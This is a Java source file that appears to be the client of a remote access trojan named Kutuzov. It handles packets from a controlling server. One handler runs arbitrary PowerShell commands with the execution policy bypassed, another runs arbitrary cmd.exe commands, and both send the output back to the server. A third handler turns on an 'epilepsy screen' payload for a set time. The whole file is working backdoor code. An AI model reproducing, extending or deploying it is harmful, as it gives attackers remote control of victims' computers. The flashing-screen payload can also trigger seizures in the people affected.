package me.kutuzov.client;

import com.profesorfalken.jpowershell.PowerShell;
import me.kutuzov.client.payloads.Payloads;
import me.kutuzov.packet.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import static me.kutuzov.client.KutuzovEntry.DEBUG;

public class KutuzovWinPackets {
    private static PowerShell powerShell;
    public static void init() { powerShell = PowerShell.openSession(); }
    public static PowerShell getPowerShell() { return powerShell; }

    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCPowershellCommandPacket) {
            new Thread(() -> {
                SCPowershellCommandPacket p = (SCPowershellCommandPacket)packet;
                if(DEBUG)
                    System.out.println("[S->C] " + p.getClass().getSimpleName() + ": " + p.command);
                String command = p.command;
                String result = "";

                String fullCommand = "powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";
                Process powerShellProcess = null;
                try {
                    powerShellProcess = Runtime.getRuntime().exec(fullCommand);
                    powerShellProcess.getOutputStream().close();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(powerShellProcess.getInputStream()));
                    powerShellProcess.waitFor();
                    String line;
                    while ((line = reader.readLine()) != null)
                        result += line + "\n";
                    reader.close();
                } catch (Exception e) {
                    if(DEBUG)e.printStackTrace();
                }

                if(DEBUG)
                    System.out.println("[C->S] CSPowershellResponsePacket init: " + result);
                try {
                    oos.writeObject(new CSPowershellResponsePacket(result));
                    if(DEBUG)
                        System.out.println("[C->S] CSPowershellResponsePacket sent");
                } catch (Exception e) { if(DEBUG) e.printStackTrace(); }
            }).start();
        } else if(packet instanceof SCEpilepsyPacket) {
            new Thread(() -> {
                SCEpilepsyPacket scEpilepsyPacket = (SCEpilepsyPacket) packet;
                Payloads.epilepsyScreenEnabled.set(true);
                try {
                    Thread.sleep(scEpilepsyPacket.time);
                } catch (InterruptedException e) {}
                Payloads.epilepsyScreenEnabled.set(false);
            }).start();
        } else if(packet instanceof SCWinCommandPacket) {
            new Thread(() -> {
                SCWinCommandPacket p = (SCWinCommandPacket)packet;
                String command = p.command;
                String result = "";

                try {
                    ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
                    builder.redirectErrorStream(true);
                    Process process = builder.start();
                    BufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while (true) {
                        line = r.readLine();
                        if (line == null)
                            break;

                        result+=line+"\n";
                    }
                } catch (Exception exception) {}

                try {
                    oos.writeObject(new CSWinCommandResponsePacket(result));
                } catch (Exception e) { if(DEBUG)e.printStackTrace(); }
            }).start();
        }
    }
}